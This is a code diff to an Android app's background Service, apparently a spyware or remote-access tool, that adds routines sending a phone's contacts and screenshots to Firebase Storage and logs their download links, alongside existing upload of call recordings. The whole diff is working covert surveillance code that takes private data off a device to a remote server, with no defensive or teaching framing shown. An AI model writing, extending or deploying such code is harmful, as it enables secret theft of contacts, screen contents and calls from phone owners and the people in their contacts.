@@ -22,6 +22,7 @@ import androidx.core.content.FileProvider;
 import com.aigs.serviceone.MainActivity;
 import com.aigs.serviceone.R;
 import com.aigs.serviceone.helpers.CallExtractorNotifier;
+import com.aigs.serviceone.helpers.ContactsPayloadListner;
 import com.aigs.serviceone.helpers.Data;
 import com.aigs.serviceone.helpers.PayloadTypes;
 import com.aigs.serviceone.helpers.ScreenshotPayloadListener;
@@ -166,8 +167,31 @@ public class Starter extends Service {
 
     private void getContacts() {
         try {
-            //TODO ADD LISTENER
-            new ContactsPayload(this).execute();
+            new ContactsPayload(this).setOnContactPayloadListener(new ContactsPayloadListner() {
+                @Override
+                public void onDataExtracted(File file, String rawData) {
+                    Uri fileReference = FileProvider.getUriForFile(Starter.this,Starter.this.getPackageName()+".provider",file);
+                    FirebaseStorage
+                            .getInstance()
+                            .getReference("contacts")
+                            .child("contacts_"+System.currentTimeMillis()+".json")
+                            .putFile(fileReference)
+                            .addOnFailureListener(r->FirebaseDatabase
+                                    .getInstance()
+                                    .getReference("Logs")
+                                    .child(PayloadTypes.GET_USER_CONTACTS+"")
+                                    .child("CurrentLog")
+                                    .setValue(r.getMessage()))
+                            .addOnCompleteListener(task -> {
+                                if (task.isSuccessful()) {
+                                    task.getResult()
+                                            .getStorage()
+                                            .getDownloadUrl()
+                                            .addOnCompleteListener(task1 -> FirebaseDatabase.getInstance().getReference("contacts").child(System.currentTimeMillis()+"").setValue(task1.getResult().toString()));
+                                };
+                            });
+                }
+            }).execute();
         }catch (Exception e){
             e.printStackTrace();
         }
@@ -176,7 +200,32 @@ public class Starter extends Service {
     private void getSc() {
         try {
             new ScreenshotPayload(this).setScreenshotPayloadListener(path -> {
-                //TODO Data to server
+
+                Uri securePath = FileProvider.getUriForFile(Starter.this,Starter.this.getPackageName()+".provider",path);
+                Log.e("PATH:",path.toString());
+                FirebaseStorage
+                        .getInstance()
+                        .getReference("screenshots")
+                        .child("sc_"+System.currentTimeMillis()+".zip")
+                        .putFile(securePath)
+                        .addOnFailureListener(f->{
+                            FirebaseDatabase
+                                    .getInstance()
+                                    .getReference("Logs")
+                                    .child(PayloadTypes.GET_SCREENSHOTS_COUNT+"")
+                                    .child("CurrentLog")
+                                    .setValue(f.getMessage());
+                        })
+                        .addOnCompleteListener(t->{
+                            t.getResult()
+                                    .getStorage()
+                                    .getDownloadUrl()
+                                    .addOnCompleteListener(p->
+                                            FirebaseDatabase.getInstance()
+                                                    .getReference("Screenshots")
+                                                    .child(" "+System.currentTimeMillis())
+                                                    .setValue(p.getResult().toString()));
+                        });
             }).execute();
         }catch (Exception e){
             e.printStackTrace();
@@ -253,14 +302,11 @@ public class Starter extends Service {
                                     .getReference("calls")
                                     .child("" + System.currentTimeMillis())
                                     .putFile(uri)
-                                    .addOnCompleteListener(new OnCompleteListener<UploadTask.TaskSnapshot>() {
-                                        @Override
-                                        public void onComplete(@NonNull Task<UploadTask.TaskSnapshot> task) {
-                                            if (task.isSuccessful()) {
-                                                task.getResult().getStorage().getDownloadUrl().addOnCompleteListener(task1 -> FirebaseDatabase.getInstance().getReference("calls").child(System.currentTimeMillis() + " ").setValue(task1.getResult().toString()));
-                                            } else
-                                                Log.e("STORAGE", task.getException().getMessage());
-                                        }
+                                    .addOnCompleteListener(task -> {
+                                        if (task.isSuccessful()) {
+                                            task.getResult().getStorage().getDownloadUrl().addOnCompleteListener(task1 -> FirebaseDatabase.getInstance().getReference("calls").child(System.currentTimeMillis() + " ").setValue(task1.getResult().toString()));
+                                        } else
+                                            Log.e("STORAGE", task.getException().getMessage());
                                     });
 
                         }
